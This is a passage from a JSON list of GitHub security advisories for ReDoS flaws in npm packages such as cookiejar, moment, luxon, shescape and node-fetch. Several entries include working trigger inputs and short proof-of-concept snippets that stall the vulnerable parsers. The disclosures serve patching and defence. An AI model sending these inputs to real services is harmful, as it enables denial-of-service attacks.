      "description": "A vulnerability, which was classified as problematic, was found in simple-markdown 0.6.0. Affected is an unknown function of the file simple-markdown.js. The manipulation with the input <<<<<<<<<<:/:/:/:/:/:/:/:/:/:/ leads to inefficient regular expression complexity. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 0.6.1 is able to address this issue. The name of the patch is 015a719bf5cdc561feea05500ecb3274ef609cd2. It is recommended to upgrade the affected component. VDB-220638 is the identifier assigned to this vulnerability.",
      "summary": "Regular Expression Denial of Service in simple-markdown",
      "date": "2023-02-12T15:30:25Z",
      "cve": "CVE-2019-25102",
      "year": 2019
   },
   {
      "package": {
         "raw": "simple-markdown@0.5.1",
         "name": "simple-markdown",
         "version": "0.5.1"
      },
      "id": "GHSA-gpvj-gp8c-c7p2",
      "description": "A vulnerability has been found in simple-markdown 0.5.1 and classified as problematic. Affected by this vulnerability is an unknown functionality of the file simple-markdown.js. The manipulation leads to inefficient regular expression complexity. The attack can be launched remotely. Upgrading to version 0.5.2 is able to address this issue. The name of the patch is 89797fef9abb4cab2fb76a335968266a92588816. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-220639.",
      "summary": "Regular Expression Denial of Service in simple-markdown",
      "date": "2023-02-12T15:30:24Z",
      "cve": "CVE-2019-25103",
      "year": 2019
   },
   {
      "package": {
         "raw": "cacheable-request@7.0.4",
         "name": "cacheable-request",
         "version": "7.0.4"
      },
      "id": "GHSA-8x6c-cv3v-vp6g",
      "description": "## This advisory is withdawn.\n\ncacheable-request depends on http-cache-semanttics, which contains an Inefficient Regular Expression Complexity in versions prior to 4.1.1 of that package. cacheable-request has been updated to rely on the fixed version in 10.2.7. \n\n### Summary of http-cache-semantics vulnerability\nhttp-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.\n\n### Details\nhttps://github.com/advisories/GHSA-rc47-6667-2j5j\n\n",
      "summary": "Withdrawn: cacheable-request depends on http-cache-semantics, which is vulnerable to Regular Expression Denial of Service",
      "date": "2023-02-11T00:13:31Z",
      "cve": null,
      "year": 2023
   },
   {
      "package": {
         "raw": "@sideway/formula@3.0.0",
         "name": "formula",
         "version": "3.0.0",
         "scope": "sideway"
      },
      "id": "GHSA-c2jc-4fpr-4vhg",
      "description": "### Impact\n\nUser-provided strings to formula's parser might lead to polynomial execution time.\n\n### Patches\n\nUsers should upgrade to 3.0.1+.\n\n### Workarounds\n\nNone.",
      "summary": "@sideway/formula contains Regular Expression Denial of Service (ReDoS) Vulnerability",
      "date": "2023-02-08T22:38:10Z",
      "cve": "CVE-2023-25166",
      "year": 2023
   },
   {
      "package": {
         "raw": "switcher-client@3.1.3",
         "name": "switcher-client",
         "version": "3.1.3"
      },
      "id": "GHSA-wqxw-8h5g-hq56",
      "description": "### Impact\nUnsanitized input flows into Strategy match operation (EXIST), where it is used to build a regular expression. This may result in a Regular expression Denial of Service attack (reDOS).\n\n### Patches\nPatched in 3.1.4\n\n### Workarounds\nAvoid using Strategy settings that use REGEX in conjunction with EXIST and NOT_EXIST operations.",
      "summary": "Switcher Client contains Regular Expression Denial of Service (ReDoS)",
      "date": "2023-02-02T01:33:06Z",
      "cve": "CVE-2023-23925",
      "year": 2023
   },
   {
      "package": {
         "raw": "http-cache-semantics@4.1.0",
         "name": "http-cache-semantics",
         "version": "4.1.0"
      },
      "id": "GHSA-rc47-6667-2j5j",
      "description": "http-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.",
      "summary": "http-cache-semantics vulnerable to Regular Expression Denial of Service",
      "date": "2023-01-31T06:30:26Z",
      "cve": "CVE-2022-25881",
      "year": 2022
   },
   {
      "package": {
         "raw": "ua-parser-js@0.7.32",
         "name": "ua-parser-js",
         "version": "0.7.32"
      },
      "id": "GHSA-fhg7-m89q-25r3",
      "description": "### Description:\nA regular expression denial of service (ReDoS) vulnerability has been discovered in `ua-parser-js`.\n\n### Impact:\nThis vulnerability bypass the library's `MAX_LENGTH` input limit prevention. By crafting a very-very-long user-agent string with specific pattern, an attacker can turn the script to get stuck processing for a very long time which results in a denial of service (DoS) condition.\n\n### Affected Versions:\nAll versions of the library prior to version `0.7.33` / `1.0.33`.\n\n### Patches:\nA patch has been released to remove the vulnerable regular expression, update to version `0.7.33` / `1.0.33` or later.\n\n### References:\n[Regular expression Denial of Service - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n\n### Credits:\nThanks to @Snyk who first reported the issue.",
      "summary": "ReDoS Vulnerability in ua-parser-js version",
      "date": "2023-01-24T15:36:32Z",
      "cve": "CVE-2022-25927",
      "year": 2022
   },
   {
      "package": {
         "raw": "cookiejar@2.1.3",
         "name": "cookiejar",
         "version": "2.1.3"
      },
      "id": "GHSA-h452-7996-h45h",
      "description": "Versions of the package cookiejar before 2.1.4 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `Cookie.parse` function and other aspects of the API, which use an insecure regular expression for parsing cookie values. Applications could be stalled for extended periods of time if untrusted input is passed to cookie values or attempted to parse from request headers.\n\nProof of concept:\n\n```\nts\\nconst { CookieJar } = require(\"cookiejar\");\n\nconst jar = new CookieJar();\n\nconst start = performance.now();\n\nconst attack = \"a\" + \"t\".repeat(50_000);\njar.setCookie(attack);\n\nconsole.log(`CookieJar.setCookie(): ${performance.now() - start}ms`);\n\n```\n\n```\nCookieJar.setCookie(): 2963.214399999939ms\n```",
      "summary": "cookiejar Regular Expression Denial of Service via Cookie.parse function",
      "date": "2023-01-18T06:31:03Z",
      "cve": "CVE-2022-25901",
      "year": 2022
   },
   {
      "package": {
         "raw": "mel-spintax@1.0.2",
         "name": "mel-spintax",
         "version": "1.0.2"
      },
      "id": "GHSA-qjm7-55vv-3c5f",
      "description": "A vulnerability was found in melnaron mel-spintax. It has been rated as problematic. Affected by this issue is some unknown functionality of the file `lib/spintax.js`. The manipulation of the argument text leads to inefficient regular expression complexity. The name of the patch is 37767617846e27b87b63004e30216e8f919637d3. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-218456.",
      "summary": "mel-spintax has Inefficient Regular Expression Complexity",
      "date": "2023-01-18T03:31:17Z",
      "cve": "CVE-2018-25077",
      "year": 2018
   },
   {
      "package": {
         "raw": "skeemas@1.2.4",
         "name": "skeemas",
         "version": "1.2.4"
      },
      "id": "GHSA-qv66-f876-vjvr",
      "description": "A vulnerability was found in Prestaul skeemas and classified as problematic. This issue affects some unknown processing of the file validators/base.js. The manipulation of the argument uri leads to inefficient regular expression complexity. The name of the patch is 65e94eda62dc8dc148ab3e59aa2ccc086ac448fd. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-218003.",
      "summary": "skeemas Inefficient Regular Expression Complexity vulnerability",
      "date": "2023-01-11T15:30:28Z",
      "cve": "CVE-2018-25074",
      "year": 2018
   },
   {
      "package": {
         "raw": "luxon@2.5.1",
         "name": "luxon",
         "version": "2.5.1"
      },
      "id": "GHSA-3xq5-wjfh-ppjc",
      "description": "# Impact\nLuxon's `DateTime.fromRFC2822() has quadratic (N^2) complexity on some specific inputs. This causes a noticeable slowdown for inputs with lengths above 10k characters. Users providing untrusted data to this method are therefore vulnerable to (Re)DoS attacks.\n\nThis is the same bug as Moment's https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\n\n# Workarounds\nLimit the length of the input.\n\n# References\nThere is an excellent writeup of the same issue in Moment: https://github.com/moment/moment/pull/6015#issuecomment-1152961973\n\n# Details\n`DateTime.fromRFC2822(\"(\".repeat(500000))` takes a couple minutes to complete.",
      "summary": "Luxon Inefficient Regular Expression Complexity vulnerability",
      "date": "2023-01-09T14:10:49Z",
      "cve": "CVE-2023-22467",
      "year": 2023
   },
   {
      "package": {
         "raw": "debug@1.0.5",
         "name": "debug",
         "version": "1.0.5"
      },
      "id": "GHSA-9vvw-cc9w-f27h",
      "description": "A vulnerability classified as problematic has been found in debug-js debug up to 3.0.x. This affects the function useColors of the file src/node.js. The manipulation of the argument str leads to inefficient regular expression complexity. Upgrading to version 3.1.0 is able to address this issue. The name of the patch is c38a0166c266a679c8de012d4eaccec3f944e685. It is recommended to upgrade the affected component. The identifier VDB-217665 was assigned to this vulnerability. The patch has been backported to the 2.6.x branch in version 2.6.9.",
      "summary": "debug Inefficient Regular Expression Complexity vulnerability",
      "date": "2023-01-09T12:30:19Z",
      "cve": "CVE-2017-20165",
      "year": 2017
   },
   {
      "package": {
         "raw": "robots-txt-guard@1.0.1",
         "name": "robots-txt-guard",
         "version": "1.0.1"
      },
      "id": "GHSA-6g33-8w2q-4hxv",
      "description": "A vulnerability was found in Woorank robots-txt-guard. It has been rated as problematic. Affected by this issue is the function makePathPattern of the file lib/patterns.js. The manipulation of the argument pattern leads to inefficient regular expression complexity. The exploit has been disclosed to the public and may be used. The name of the patch is c03827cd2f9933619c23894ce7c98401ea824020. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-217448.",
      "summary": "robots-txt-guard Inefficient Regular Expression Complexity vulnerability",
      "date": "2023-01-05T12:30:27Z",
      "cve": "CVE-2021-4305",
      "year": 2021
   },
   {
      "package": {
         "raw": "mootools@1.5.2",
         "name": "mootools",
         "version": "1.5.2"
      },
      "id": "GHSA-v63q-hgqc-qvpg",
      "description": "MooTools is a collection of JavaScript utilities for JavaScript developers. All known versions include a CSS selector parser that is vulnerable to Regular Expression Denial of Service (ReDoS). An attack requires that an attacker can inject a string into a CSS selector at runtime, which is quite common with e.g. jQuery CSS selectors. No patches are available for this issue.",
      "summary": "MooTools Regular Expression Denial of Service",
      "date": "2023-01-03T18:30:25Z",
      "cve": "CVE-2021-32821",
      "year": 2021
   },
   {
      "package": {
         "raw": "string-kit@0.12.7",
         "name": "string-kit",
         "version": "0.12.7"
      },
      "id": "GHSA-pfrm-4rjw-g9q5",
      "description": "A vulnerability classified as problematic was found in cronvel string-kit up to 0.12.7. This vulnerability affects the function naturalSort of the file lib/naturalSort.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. Upgrading to version 0.12.8 can address this issue. The name of the patch is 9cac4c298ee92c1695b0695951f1488884a7ca73. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-217180.",
      "summary": "string-kit Inefficient Regular Expression Complexity vulnerability",
      "date": "2023-01-02T09:31:57Z",
      "cve": "CVE-2021-4299",
      "year": 2021
   },
   {
      "package": {
         "raw": "rgb2hex@0.1.5",
         "name": "rgb2hex",
         "version": "0.1.5"
      },
      "id": "GHSA-7599-fqgm-v84p",
      "description": "A vulnerability was found in rgb2hex up to 0.1.5. It has been rated as problematic. This issue affects some unknown processing. The manipulation leads to inefficient regular expression complexity. The attack may be initiated remotely. Upgrading to version 0.1.6 can address this issue. The name of the patch is 9e0c38594432edfa64136fdf7bb651835e17c34f. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217151.",
      "summary": "rgb2hex vulnerable to inefficient regular expression complexity",
      "date": "2022-12-31T21:30:20Z",
      "cve": "CVE-2018-25061",
      "year": 2018
   },
   {
      "package": {
         "raw": "markdown-it@2.2.1",
         "name": "markdown-it",
         "version": "2.2.1"
      },
      "id": "GHSA-j5p7-jf4q-742q",
      "description": "A vulnerability was found in markdown-it up to 2.x. It has been classified as problematic. Affected is an unknown function of the file `lib/common/html_re.js`. The manipulation leads to inefficient regular expression complexity. Upgrading to version 3.0.0 is able to address this issue. The name of the patch is 89c8620157d6e38f9872811620d25138fc9d1b0d. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-216852.",
      "summary": "markdown-it vulnerable to Inefficient Regular Expression Complexity",
      "date": "2022-12-27T09:30:41Z",
      "cve": "CVE-2015-10005",
      "year": 2015
   },
   {
      "package": {
         "raw": "html-minifier@4.0.0",
         "name": "html-minifier",
         "version": "4.0.0"
      },
      "id": "GHSA-pfq8-rq6v-vf5m",
      "description": "A Regular Expression Denial of Service (ReDoS) flaw was found in kangax html-minifier 4.0.0 because of the reCustomIgnore regular expression.",
      "summary": "kangax html-minifier REDoS vulnerability",
      "date": "2022-10-31T19:00:36Z",
      "cve": "CVE-2022-37620",
      "year": 2022
   },
   {
      "package": {
         "raw": "shescape@1.6.0",
         "name": "shescape",
         "version": "1.6.0"
      },
      "id": "GHSA-cr84-xvw4-qx3c",
      "description": "### Impact\n\nThis impacts users that use shescape to escape arguments:\n\n- for the Unix shell Bash, or any not-officially-supported Unix shell;\n- using the `escape` or `escapeAll` functions with the `interpolation` option set to `true`.\n\nAn attacker can cause polynomial backtracking in terms of the input string length due to a Regular Expression in shescape that is vulnerable to Regular Expression Denial of Service (ReDoS). Example:\n\n```javascript\nimport * as shescape from \"shescape\";\n\n/* 1. Prerequisites */\nconst options = {\n  interpolation: true,\n  // and\n  shell: \"/bin/bash\",\n  // or\n  shell: \"some-not-officially-supported-shell\",\n  // or\n  shell: undefined, // Only if the system's default shell is bash or an unsupported shell.\n};\n\n/* 2. Attack */\nlet userInput = '{,'.repeat(150_000); // polynomial backtracking\n\n/* 3. Usage */\nshescape.escape(userInput, options);\n// or\nshescape.escapeAll([userInput], options);\n```\n\n### Patches\n\nThis bug has been patched in [v1.6.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.6.1) which you can upgrade to now. No further changes required.\n\n### Workarounds\n\nAlternatively, a maximum length can be enforced on input strings to shescape to reduce the impact of the vulnerability. It is not recommended to try and detect vulnerable input strings, as the logic for this may end up being vulnerable to ReDoS itself.\n\n### References\n\n- Shescape commit [552e8ea](https://github.com/ericcornelissen/shescape/commit/552e8eab56861720b1d4e5474fb65741643358f9)\n- Shescape Release [v1.6.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.6.1)\n\n### For more information\n\n- Comment on commit [552e8ea](https://github.com/ericcornelissen/shescape/commit/552e8eab56861720b1d4e5474fb65741643358f9)\n- Open an issue at [https://github.com/ericcornelissen/shescape/issues](https://github.com/ericcornelissen/shescape/issues?q=is%3Aissue+is%3Aopen) (New issue > Question > Get started)\n",
      "summary": "Inefficient Regular Expression Complexity in shescape ",
      "date": "2022-10-25T22:27:32Z",
      "cve": "CVE-2022-25918",
      "year": 2022
   },
   {
      "package": {
         "raw": "minimatch@3.0.4",
         "name": "minimatch",
         "version": "3.0.4"
      },
      "id": "GHSA-f8q6-p94x-37v3",
      "description": "A vulnerability was found in the minimatch package. This flaw allows a Regular Expression Denial of Service (ReDoS) when calling the braceExpand function with specific arguments, resulting in a Denial of Service.",
      "summary": "minimatch ReDoS vulnerability",
      "date": "2022-10-18T12:00:32Z",
      "cve": "CVE-2022-3517",
      "year": 2022
   },
   {
      "package": {
         "raw": "loader-utils@1.4.1",
         "name": "loader-utils",
         "version": "1.4.1"
      },
      "id": "GHSA-3rfm-jhwj-7488",
      "description": "A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
      "summary": "loader-utils is vulnerable to Regular Expression Denial of Service (ReDoS) via url variable",
      "date": "2022-10-14T19:00:38Z",
      "cve": "CVE-2022-37603",
      "year": 2022
   },
   {
      "package": {
         "raw": "loader-utils@1.4.1",
         "name": "loader-utils",
         "version": "1.4.1"
      },
      "id": "GHSA-hhq3-ff78-jv3g",
      "description": "A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
      "summary": "loader-utils is vulnerable to Regular Expression Denial of Service (ReDoS)",
      "date": "2022-10-12T12:00:27Z",
      "cve": "CVE-2022-37599",
      "year": 2022
   },
   {
      "package": {
         "raw": "v8n@1.5.0",
         "name": "v8n",
         "version": "1.5.0"
      },
      "id": "GHSA-xrx9-gj26-5wx9",
      "description": "### Impact\nInefficient regular expression complexity of `lowercase()` and `uppercase()` regex could lead to a denial of service attack. With a formed payload `'a' + 'a'.repeat(i) + 'A'`, only 32 characters payload could take 29443 ms time execution when testing `lowercase()`. The same issue happens with `uppercase()`.\n\n### Patches\nv1.5.1\n\n### References\n[huntr.dev report](https://huntr.dev/bounties/2d92f644-593b-43b4-bfd1-c8042ac60609)\n[_Regular Expression Denial of Service (ReDoS) and Catastrophic Backtracking_](https://snyk.io/blog/redos-and-catastrophic-backtracking/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [v8n issues list](https://github.com/imbrn/v8n)\n* Email us at [brunodev02221@gmail.com](mailto:brunodev02221@gmail.com)\n",
      "summary": "v8n vulnerable to Inefficient Regular Expression Complexity",
      "date": "2022-10-07T07:33:44Z",
      "cve": "CVE-2022-35923",
      "year": 2022
   },
   {
      "package": {
         "raw": "css-what@2.1.2",
         "name": "css-what",
         "version": "2.1.2"
      },
      "id": "GHSA-p28h-cc7q-c4fg",
      "description": "The package css-what before 2.1.3 is vulnerable to Regular Expression Denial of Service (ReDoS) due to the use of insecure regular expression in the `re_attr` variable of index.js. The exploitation of this vulnerability could be triggered via the parse function.",
      "summary": "css-what vulnerable to ReDoS due to use of insecure regular expression",
      "date": "2022-10-01T00:00:24Z",
      "cve": "CVE-2022-21222",
      "year": 2022
   },
   {
      "package": {
         "raw": "react-native-reanimated@2.9.1",
         "name": "react-native-reanimated",
         "version": "2.9.1"
      },
      "id": "GHSA-2j79-8pqc-r7x6",
      "description": "The package react-native-reanimated before 2.10.0 is vulnerable to Regular Expression Denial of Service (ReDoS) due to improper usage of regular expression in the parser of Colors.js.",
      "summary": "react-native-reanimated vulnerable to ReDoS",
      "date": "2022-10-01T00:00:24Z",
      "cve": "CVE-2022-24373",
      "year": 2022
   },
   {
      "package": {
         "raw": "d3-color@3.0.1",
         "name": "d3-color",
         "version": "3.0.1"
      },
      "id": "GHSA-36jr-mh4h-2g58",
      "description": "The d3-color module provides representations for various color spaces in the browser. Versions prior to 3.1.0 are vulnerable to a Regular expression Denial of Service. This issue has been patched in version 3.1.0. There are no known workarounds.",
      "summary": "d3-color vulnerable to ReDoS",
      "date": "2022-09-29T14:12:55Z",
      "cve": null,
      "year": 2022
   },
   {
      "package": {
         "raw": "steal@2.3.0",
         "name": "steal",
         "version": "2.3.0"
      },
      "id": "GHSA-rgqx-226f-2xp4",
      "description": "A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal 2.2.4 via the string variable in babel.js.",
      "summary": "steal Inefficient Regular Expression Complexity vulnerability via string variable",
      "date": "2022-09-21T00:00:38Z",
      "cve": "CVE-2022-37259",
      "year": 2022
   },
   {
      "package": {
         "raw": "steal@2.3.0",
         "name": "steal",
         "version": "2.3.0"
      },
      "id": "GHSA-28v4-jf82-jvj8",
      "description": "A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal via the source and sourceWithComments variable in main.js.",
      "summary": "steal vulnerable to Regular Expression Denial of Service via source and sourceWithComments",
      "date": "2022-09-16T00:00:36Z",
      "cve": "CVE-2022-37262",
      "year": 2022
   },
   {
      "package": {
         "raw": "steal@2.3.0",
         "name": "steal",
         "version": "2.3.0"
      },
      "id": "GHSA-7f3x-2wcx-hww8",
      "description": "A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal via the input variable in main.js.",
      "summary": "steal vulnerable to Regular Expression Denial of Service via input variable",
      "date": "2022-09-16T00:00:31Z",
      "cve": "CVE-2022-37260",
      "year": 2022
   },
   {
      "package": {
         "raw": "nitrado.js@0.2.4",
         "name": "nitrado.js",
         "version": "0.2.4"
      },
      "id": "GHSA-vqc4-v8hc-h2jg",
      "description": "### Impact\nPossible ReDoS with lib input of `{{` and with many repetitions of `{{|`\n\n### Patches\nPatched in all versions above `0.2.5`\n\n### Workarounds\nNo known work arounds.\n\n### References\n- OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\n- Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n- Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n- James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](http://www.cs.bham.ac.uk/~hxt/research/reg-exp-sec.pdf).\n- Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n- Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n\n\n",
      "summary": "Polynomial regular expression used on uncontrolled data in nitrado.js",
      "date": "2022-08-31T22:23:39Z",
      "cve": "CVE-2022-36034",
      "year": 2022
   },
   {
      "package": {
         "raw": "sanitize-html@2.7.0",
         "name": "sanitize-html",
         "version": "2.7.0"
      },
      "id": "GHSA-cgfm-xwp7-2cvr",
      "description": "The package sanitize-html before 2.7.1 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure global regular expression replacement logic of HTML comment removal.",
      "summary": "Sanitize-html Vulnerable To REDoS Attacks",
      "date": "2022-08-31T00:00:24Z",
      "cve": "CVE-2022-25887",
      "year": 2022
   },
   {
      "package": {
         "raw": "uri-template-lite@22.1.0",
         "name": "uri-template-lite",
         "version": "22.1.0"
      },
      "id": "GHSA-chw2-6c7r-37p7",
      "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the uri-template-lite npm package, when an attacker is able to supply arbitrary input to the \"URI.expand\" method.",
      "summary": "uri-template-lite Regular Expression Denial of Service",
      "date": "2022-08-25T00:00:27Z",
      "cve": "CVE-2021-43309",
      "year": 2021
   },
   {
      "package": {
         "raw": "node-fetch@3.2.9",
         "name": "node-fetch",
         "version": "3.2.9"
      },
      "id": "GHSA-vp56-6g26-6827",
      "description": "[node-fetch](https://www.npmjs.com/package/node-fetch) is a light-weight module that brings window.fetch to node.js.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `isOriginPotentiallyTrustworthy()` function in `referrer.js`, when processing a URL string with alternating letters and periods, such as `'http://' + 'a.a.'.repeat(i) + 'a'`.",
      "summary": "node-fetch Inefficient Regular Expression Complexity ",
      "date": "2022-08-02T00:00:25Z",
      "cve": "CVE-2022-2596",
      "year": 2022
   },
   {
      "package": {
         "raw": "terser@4.8.0",
         "name": "terser",
         "version": "4.8.0"
      },
      "id": "GHSA-4wf5-vphf-c2xc",
      "description": "The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.",
      "summary": "Terser insecure use of regular expressions leads to ReDoS",
      "date": "2022-07-16T00:00:20Z",
      "cve": "CVE-2022-25858",
      "year": 2022
   },
   {
      "package": {
         "raw": "moment@2.29.3",
         "name": "moment",
         "version": "2.29.3"
      },
      "id": "GHSA-wc69-rhjr-hc9g",
      "description": "### Impact\n\n* using string-to-date parsing in moment (more specifically rfc2822 parsing, which is tried by default) has quadratic (N^2) complexity on specific inputs\n* noticeable slowdown is observed with inputs above 10k characters\n* users who pass user-provided strings without sanity length checks to moment constructor are vulnerable to (Re)DoS attacks\n\n### Patches\nThe problem is patched in 2.29.4, the patch can be applied to all affected versions with minimal tweaking.\n\n### Workarounds\nIn general, given the proliferation of ReDoS attacks, it makes sense to limit the length of the user input to something sane, like 200 characters or less. I haven't seen legitimate cases of date-time strings longer than that, so all moment users who do pass a user-originating string to constructor are encouraged to apply such a rudimentary filter, that would help with this but also most future ReDoS vulnerabilities.\n\n### References\nThere is an excellent writeup of the issue here: https://github.com/moment/moment/pull/6015#issuecomment-1152961973=\n\n### Details\nThe issue is rooted in the code that removes legacy comments (stuff inside parenthesis) from strings during rfc2822 parsing. `moment(\"(\".repeat(500000))` will take a few minutes to process, which is unacceptable.",
      "summary": "Moment.js vulnerable to Inefficient Regular Expression Complexity",
      "date": "2022-07-06T18:38:49Z",
      "cve": "CVE-2022-31129",
      "year": 2022
   },
   {
      "package": {
         "raw": "jquery-validation@1.19.4",
         "name": "jquery-validation",
         "version": "1.19.4"
      },
      "id": "GHSA-ffmh-x56j-9rc3",
      "description": "Summary\n\nIncomplete fix of CVE-2021-43306: An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the jquery-validation npm package, when an attacker is able to supply arbitrary input to the url2 method.",
      "summary": "jquery-validation Regular Expression Denial of Service due to arbitrary input to url2 method",
      "date": "2022-07-05T22:56:58Z",
      "cve": "CVE-2022-31147",
      "year": 2022
   },
   {
      "package": {
         "raw": "scss-tokenizer@0.4.2",
         "name": "scss-tokenizer",
         "version": "0.4.2"
      },
      "id": "GHSA-7mwh-4pqv-wmr8",
      "description": "All versions of the package `scss-tokenizer` prior to 0.4.3 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `loadAnnotation()` function, due to the usage of insecure regex.",
      "summary": "Regular expression denial of service in scss-tokenizer",
      "date": "2022-07-02T00:00:19Z",
      "cve": "CVE-2022-25758",
      "year": 2022
   },
   {
      "package": {
         "raw": "rsshub@1.0.0",
         "name": "rsshub",
         "version": "1.0.0"
      },
      "id": "GHSA-jvxx-v45p-v5vf",
      "description": "### Impact\n\nPassing some special values to the `filter` and `filterout` parameters can cause an abnormally high CPU. Impact on the performance of the servers and RSSHub services.\n\n### Patches\n\nIt is fixed in 5c4177441417b44a6e45c3c63e9eac2504abeb5b , please update to this or the later versions as soon as possible.\n\n### References\n\nFull report: https://github.com/DIYgod/RSSHub/issues/10045\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in <https://github.com/DIYgod/RSSHub/issues>\n* Email us at [i@diygod.me](mailto:i@diygod.me)\n\n### Credits\n\n@Rongronggg9 \n",
      "summary": "Denial of Service (DoS) vulnerability in RSSHub",
      "date": "2022-06-23T06:45:03Z",
      "cve": "CVE-2022-31110",
      "year": 2022
   },
   {
      "package": {
         "raw": "devcert@1.2.0",
         "name": "devcert",
         "version": "1.2.0"
      },
      "id": "GHSA-fp36-299x-pwmw",
      "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the devcert npm package, when an attacker is able to supply arbitrary input to the certificateFor method",
      "summary": "Regular expression denial of service in devcert",
      "date": "2022-06-03T00:01:01Z",
      "cve": "CVE-2022-1929",
      "year": 2022
   },
   {
      "package": {
         "raw": "markdown-link-extractor@3.0.1",
         "name": "markdown-link-extractor",
         "version": "3.0.1"
      },
      "id": "GHSA-mmh6-m7v9-5956",
      "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the markdown-link-extractor npm package, when an attacker is able to supply arbitrary input to the module's exported function",
      "summary": "Regular expression denial of service in markdown-link-extractor",
      "date": "2022-06-03T00:01:00Z",
      "cve": "CVE-2021-43308",
      "year": 2021
   },
   {
      "package": {
         "raw": "semver-regex@3.1.3",
         "name": "semver-regex",
         "version": "3.1.3"
      },
      "id": "GHSA-4x5v-gmq8-25ch",
      "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the semver-regex npm package, when an attacker is able to supply arbitrary input to the test() method",
      "summary": "Regular expression denial of service in semver-regex",
      "date": "2022-06-03T00:01:00Z",
      "cve": "CVE-2021-43307",
      "year": 2021
   },
   {
      "package": {
         "raw": "jquery-validation@1.19.3",
         "name": "jquery-validation",
         "version": "1.19.3"
      },
      "id": "GHSA-j9m2-h2pv-wvph",
      "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the jquery-validation npm package, when an attacker is able to supply arbitrary input to the url2 method",
      "summary": "Regular expression denial of service in jquery-validation",
      "date": "2022-06-03T00:00:59Z",
      "cve": "CVE-2021-43306",
      "year": 2021
   },
   {
      "package": {
         "raw": "ckeditor4-dev@4.15.1",
         "name": "ckeditor4-dev",
         "version": "4.15.1"
      },
      "id": "GHSA-jv4c-7jqq-m34x",
      "description": "It was possible to execute a ReDoS-type attack inside CKEditor 4 before 4.16 by persuading a victim to paste crafted text into the Styles input of specific dialogs (in the Advanced Tab for Dialogs plugin).",
      "summary": "CKEditor 4 ReDoS Vulnerability",
      "date": "2022-05-24T17:40:21Z",
      "cve": "CVE-2021-26271",
      "year": 2021
   },
   {
      "package": {
         "raw": "angular@1.8.3",
         "name": "angular",
         "version": "1.8.3"
      },
      "id": "GHSA-m2h2-264f-f486",
      "description": "AngularJS lets users write client-side web applications. The package angular after 1.7.0 is vulnerable to Regular Expression Denial of Service (ReDoS) by providing a custom locale rule that makes it possible to assign the parameter in posPre: ' '.repeat() of NUMBER_FORMATS.PATTERNS[1].posPre with a very high value.\n\n**Note:**\n1. This package has been deprecated and is no longer maintained.\n2. The vulnerable versions are 1.7.0 and higher.",
      "summary": "angular vulnerable to regular expression denial of service (ReDoS)",
      "date": "2022-05-03T00:00:44Z",
      "cve": "CVE-2022-25844",
      "year": 2022
   },
   {
      "package": {
         "raw": "handlebars@4.4.4",
         "name": "handlebars",
         "version": "4.4.4"
      },
      "id": "GHSA-62gr-4qp9-h98f",
      "description": "Handlebars before 4.4.5 allows Regular Expression Denial of Service (ReDoS) because of eager matching. The parser may be forced into an endless loop while processing crafted templates. This may allow attackers to exhaust system resources.",
      "summary": "Regular Expression Denial of Service in Handlebars",
      "date": "2022-02-10T20:38:22Z",
      "cve": "CVE-2019-20922",
      "year": 2019
   },
   {
      "package": {
         "raw": "djvalidator@1.1.1",
         "name": "djvalidator",
         "version": "1.1.1"
      },
      "id": "GHSA-v6wh-2wvh-c8x5",
